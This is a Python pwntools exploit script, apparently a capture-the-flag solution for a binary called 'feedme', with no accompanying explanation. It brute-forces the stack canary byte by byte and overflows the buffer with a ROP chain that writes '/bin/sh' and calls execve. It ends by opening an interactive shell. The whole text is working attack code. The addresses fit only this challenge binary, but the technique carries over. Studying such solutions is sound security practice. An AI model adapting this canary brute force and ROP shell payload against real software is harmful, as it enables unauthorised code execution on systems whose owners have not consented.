from pwn import *

def breakCanary():
    known_canary = b"\x00"
    hex_canary = "00"
    canary = 0x0
    inp_bytes = 0x22
    for j in range(0,3):
        for i in range(0xff):
            log.info("trying canary: " + hex(canary) + hex_canary)
            target.send(p32(inp_bytes)[0].to_bytes(1, byteorder = 'little'))

            target.send(b"0"*0x20 + known_canary + p32(canary)[0].to_bytes(1, byteorder = 'little'))
            output = target.recvuntil(b"exit.")
            if b"YUM" in output:
                print("next byte is: " + hex(canary))
                known_canary = known_canary + p32(canary)[0].to_bytes(1, byteorder = 'little')
                inp_bytes = inp_bytes + 1
                new_canary = hex(canary)
                new_canary = new_canary.replace("0x", "")
                hex_canary = new_canary + hex_canary
                canary = 0x0
                break
            else:
                canary = canary + 0x1
    return int(hex_canary, 16)

target = process('./feedme')

canary = breakCanary()
log.info("the canary is: " + hex(canary))

payload = b"0" * 0x20 + p32(canary)

payload += b"0" * 0xc

payload += p32(0x80bb496)
payload += p32(0x80eaf80)
payload += p32(0x0806f34a) #pop edx
payload += p32(0x6e69622f)
payload += p32(0x0807be31) #mov
payload += p32(0x80bb496)
payload += p32(0x80eaf84)
payload += p32(0x0806f34a)
payload += p32(0x0068732f)
payload += p32(0x0807be31) #mov
payload += p32(0x80bb496)
payload += p32(0xb)
payload += p32(0x0806f34a)
payload += p32(0x0)
payload += p32(0x806f371)
payload += p32(0x0)
payload += p32(0x80eaf80)
payload += p32(0x806fa1e)

target.send(b"\x78")
target.send(payload)
target.interactive()

                
                        
